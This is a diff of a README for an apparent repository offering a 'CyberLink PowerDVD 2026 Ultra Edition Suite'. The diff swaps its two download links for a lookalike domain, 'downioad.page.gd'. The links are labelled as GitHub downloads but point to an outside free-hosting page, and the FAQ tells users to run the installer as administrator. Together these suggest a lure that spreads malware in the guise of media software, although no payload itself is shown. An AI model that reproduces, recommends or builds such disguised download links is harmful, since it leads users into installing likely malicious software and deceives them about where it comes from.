@@ -2,7 +2,7 @@
 
 Welcome to the CyberLink PowerDVD 2026 Ultra Edition Suite repository. This project provides a comprehensive set of enhancements and tools specifically crafted for Windows desktop users who seek to elevate their media playback experience with CyberLink PowerDVD. Whether you're watching Blu-rays, streaming content, or playing local video files, this suite offers customizable options and performance improvements to suit your needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -80,7 +80,7 @@ A: Ensure that you are running the installer as an administrator and that your s
 
 For the latest version of the CyberLink PowerDVD 2026 Ultra Edition Suite, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
 
